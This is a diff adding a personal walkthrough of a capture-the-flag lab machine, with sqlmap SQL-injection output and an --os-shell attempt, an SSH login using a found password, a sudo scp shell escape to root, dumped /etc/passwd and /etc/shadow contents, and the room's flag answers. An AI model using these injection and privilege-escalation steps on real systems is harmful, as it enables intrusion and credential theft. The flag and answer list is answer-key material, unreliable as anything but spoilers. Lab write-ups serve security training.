@@ -305,3 +305,311 @@ maybe using --random-agent and --tamper=between will work too
 ```text
 ┌──(kali㉿kali)-[~/nappy/DX1]
 └─$ sqlmap -u 'http://10.10.87.126/item.php?id=5' --os-shell
+        ___
+       __H__                                                                                                                              
+ ___ ___[.]_____ ___ ___  {1.6.12#stable}                                                                                                 
+|_ -| . [(]     | .'| . |                                                                                                                 
+|___|_  [,]_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:19:13 /2023-01-14/
+
+[14:19:13] [INFO] resuming back-end DBMS 'mysql' 
+[14:19:13] [INFO] testing connection to the target URL
+[14:19:27] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=5 AND 2300=2300
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=5 AND GTID_SUBSET(CONCAT(0x716b627071,(SELECT (ELT(6652=6652,1))),0x716a786271),6652)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=5 AND (SELECT 4991 FROM (SELECT(SLEEP(5)))hzDI)
+---
+[14:19:27] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[14:19:27] [INFO] going to use a web backdoor for command prompt
+[14:19:27] [INFO] fingerprinting the back-end DBMS operating system
+[14:19:41] [WARNING] reflective value(s) found and filtering out
+[14:19:41] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[14:19:41] [INFO] the back-end DBMS operating system is Linux
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4
+
+Y
+[14:20:58] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+> Y
+[14:20:58] [INFO] retrieved web server absolute paths: '/item~.php'
+[14:20:58] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[14:21:13] [WARNING] unable to upload the file stager on '/var/www/'
+[14:21:13] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+[14:21:27] [WARNING] unable to upload the file stager on '/var/www/html/'
+[14:21:27] [INFO] trying to upload the file stager on '/var/www/htdocs/' via LIMIT 'LINES TERMINATED BY' method
+[14:21:42] [WARNING] unable to upload the file stager on '/var/www/htdocs/'
+[14:21:42] [INFO] trying to upload the file stager on '/usr/local/apache2/htdocs/' via LIMIT 'LINES TERMINATED BY' method
+[14:21:57] [WARNING] unable to upload the file stager on '/usr/local/apache2/htdocs/'
+[14:21:57] [INFO] trying to upload the file stager on '/usr/local/www/data/' via LIMIT 'LINES TERMINATED BY' method
+[14:22:13] [WARNING] unable to upload the file stager on '/usr/local/www/data/'
+[14:22:13] [INFO] trying to upload the file stager on '/var/apache2/htdocs/' via LIMIT 'LINES TERMINATED BY' method
+[14:22:29] [WARNING] unable to upload the file stager on '/var/apache2/htdocs/'
+[14:22:29] [INFO] trying to upload the file stager on '/var/www/nginx-default/' via LIMIT 'LINES TERMINATED BY' method
+[14:22:42] [WARNING] unable to upload the file stager on '/var/www/nginx-default/'
+[14:22:42] [INFO] trying to upload the file stager on '/srv/www/htdocs/' via LIMIT 'LINES TERMINATED BY' method
+[14:22:57] [WARNING] unable to upload the file stager on '/srv/www/htdocs/'
+[14:22:57] [INFO] trying to upload the file stager on '/usr/local/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[14:23:13] [WARNING] unable to upload the file stager on '/usr/local/var/www/'
+[14:23:13] [INFO] trying to upload the file stager on '/' via LIMIT 'LINES TERMINATED BY' method
+
+https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#overview
+
+using ssh
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~/nappy/DX1]
+└─$ ssh dennis@10.10.85.176 
+The authenticity of host '10.10.85.176 (10.10.85.176)' can't be established.
+ED25519 key fingerprint is SHA256:mYJfS6ZzIpij07jaVOhMJAiaP90i+wUWV67p1+lbGj4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.85.176' (ED25519) to the list of known hosts.
+dennis@10.10.85.176's password:  ih8dinos
+Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  Get cloud support with Ubuntu Advantage Cloud Guest:
+    http://www.ubuntu.com/business/services/cloud
+
+62 packages can be updated.
+45 updates are security updates.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+dennis@ip-10-10-85-176:~$ id
+uid=1001(dennis) gid=1001(dennis) groups=1001(dennis)
+
+dennis@ip-10-10-85-176:~$ cat flag1.txt
+Congrats on finding the first flag.. But what about the rest? :O
+
+b89f2d69c56b9981ac92dd267f
+
+dennis@ip-10-10-85-176:~$ grep -iR flag
+test.sh:cat /root/flag5.txt
+.bash_history:Flag3:b4973bbc9053807856ec815db25fb3f1
+.bash_history:sudo scp /root/flag5.txt ben@10.8.0.6:/
+.bash_history:sudo scp /root/flag5.txt ben@10.8.0.6:~/
+.bash_history:sudo scp /root/flag5.txt ben@10.8.0.6:~/ -v
+.bash_history:sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
+.bash_history:sudo scp -v /root/flag5.txt ben@localhost:~/
+.bash_history:sudo scp -v /root/flag5.txt dennis@localhost:~/
+.bash_history:sudo scp -v /root/flag5.txt dennis@10.0.0.59:~/
+.bash_history:sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
+.bash_history:sudo scp /root/flag5.txt ben@10.8.0.6:~/
+.bash_history:sudo scp /root/flag5.txt ben@88.104.10.206:~/
+.bash_history:sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
+.bash_history:sudo scp /root/flag5.txt ben@10.8.0.6:~/
+flag1.txt:Congrats on finding the first flag.. But what about the rest? :O
+.viminfo:       vim flagFour.txt
+.viminfo:       vim flag1.txt 
+.viminfo:'3  1802  31  /tmp/flagFour.txt
+.viminfo:'4  1  63  ~/flag1.txt
+.viminfo:'5  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1802  31  /tmp/flagFour.txt
+.viminfo:-'  1  0  /tmp/flagFour.txt
+.viminfo:-'  1  63  ~/flag1.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  63  ~/flag1.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1802  31  /tmp/flagFour.txt
+.viminfo:-'  1  0  /tmp/flagFour.txt
+.viminfo:-'  1  63  ~/flag1.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  63  ~/flag1.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:-'  1  31  /boot/grub/fonts/flagTwo.txt
+.viminfo:> /tmp/flagFour.txt
+.viminfo:> ~/flag1.txt
+.viminfo:> /boot/grub/fonts/flagTwo.txt
+
+dennis@ip-10-10-85-176:~$ cat /boot/grub/fonts/flagTwo.txt
+96ccd6b429be8c9a4b501c7a0b117b0a
+
+dennis@ip-10-10-85-176:~$ cat .bash_history 
+Flag3:b4973bbc9053807856ec815db25fb3f1
+
+dennis@ip-10-10-85-176:~$ cat test.sh 
+#!/bin/bash
+cat /root/flag5.txt
+dennis@ip-10-10-85-176:~$ ls -lah
+total 44K
+drwxr-xr-x 3 dennis dennis 4.0K Jan 14 22:37 .
+drwxr-xr-x 4 root   root   4.0K Feb 16  2019 ..
+-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
+-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
+-rw-r--r-- 1 dennis dennis 3.7K Feb 16  2019 .bashrc
+drwx------ 2 dennis dennis 4.0K Jan 14 22:37 .cache
+-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
+-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
+-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
+-rw------- 1 dennis dennis 4.3K Feb 16  2019 .viminfo
+
+priv esc
+
+https://gtfobins.github.io/gtfobins/scp/
+
+TF=$(mktemp)
+echo 'sh 0<&2 1>&2' > $TF
+chmod +x "$TF"
+sudo scp -S $TF x y:
+
+dennis@ip-10-10-85-176:~$ sudo -l
+Matching Defaults entries for dennis on ip-10-10-85-176.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dennis may run the following commands on ip-10-10-85-176.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: /usr/bin/scp
+dennis@ip-10-10-85-176:~$ TF=$(mktemp)
+dennis@ip-10-10-85-176:~$ echo 'sh 0<&2 1>&2' > $TF
+dennis@ip-10-10-85-176:~$ chmod +x "$TF"
+dennis@ip-10-10-85-176:~$ sudo scp -S $TF x y:
+```
+```text
+# cat /root/flag5.txt
+2a7074e491fcacc7eeba97808dc5e2ec
+```
+```text
+# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
+dennis:x:1001:1001:Dennis,,,:/home/dennis:/bin/bash
+```
+```text
+# cat /etc/shadow
+root:*:17849:0:99999:7:::
+daemon:*:17849:0:99999:7:::
+bin:*:17849:0:99999:7:::
+sys:*:17849:0:99999:7:::
+sync:*:17849:0:99999:7:::
+games:*:17849:0:99999:7:::
+man:*:17849:0:99999:7:::
+lp:*:17849:0:99999:7:::
+mail:*:17849:0:99999:7:::
+news:*:17849:0:99999:7:::
+uucp:*:17849:0:99999:7:::
+proxy:*:17849:0:99999:7:::
+www-data:*:17849:0:99999:7:::
+backup:*:17849:0:99999:7:::
+list:*:17849:0:99999:7:::
+irc:*:17849:0:99999:7:::
+gnats:*:17849:0:99999:7:::
+nobody:*:17849:0:99999:7:::
+systemd-timesync:*:17849:0:99999:7:::
+systemd-network:*:17849:0:99999:7:::
+systemd-resolve:*:17849:0:99999:7:::
+systemd-bus-proxy:*:17849:0:99999:7:::
+syslog:*:17849:0:99999:7:::
+_apt:*:17849:0:99999:7:::
+lxd:*:17849:0:99999:7:::
+messagebus:*:17849:0:99999:7:::
+uuidd:*:17849:0:99999:7:::
+dnsmasq:*:17849:0:99999:7:::
+sshd:*:17849:0:99999:7:::
+pollinate:*:17849:0:99999:7:::
+ubuntu:!:17943:0:99999:7:::
+mysql:!:17943:0:99999:7:::
+dennis:$6$z2jJDHk8$2kdOlS5PLeeETO0DdUJ.tYHptXAQX2pCUNc6rmHCZNJkuHsY7Y5tcE5yxSSZK850Z4EjgPh6WXldhs4SWPYsB.:17943:0:99999:7:::
+```
+![[Pasted image 20230114125950.png]]
+![[Pasted image 20230114132102.png]]
+What is the SQL database called which is serving the shop information?
+*park*
+How many columns does the table have?
+*5*
+Whats the system version?
+*ubuntu 16.04*
+What is dennis' password?
+*ih8dinos*
+Locate and get the first flag contents.
+*b89f2d69c56b9981ac92dd267f*
+Whats the contents of the second flag?
+*96ccd6b429be8c9a4b501c7a0b117b0a*
+Whats the contents of the third flag?
+*b4973bbc9053807856ec815db25fb3f1*
+There is no fourth flag.
+Completed
+Whats the contents of the fifth flag?
+Enumerate your privileges.
+*2a7074e491fcacc7eeba97808dc5e2ec*
+
+## Notes / Lessons Learned
+[[DX1 Liberty Island]]
+
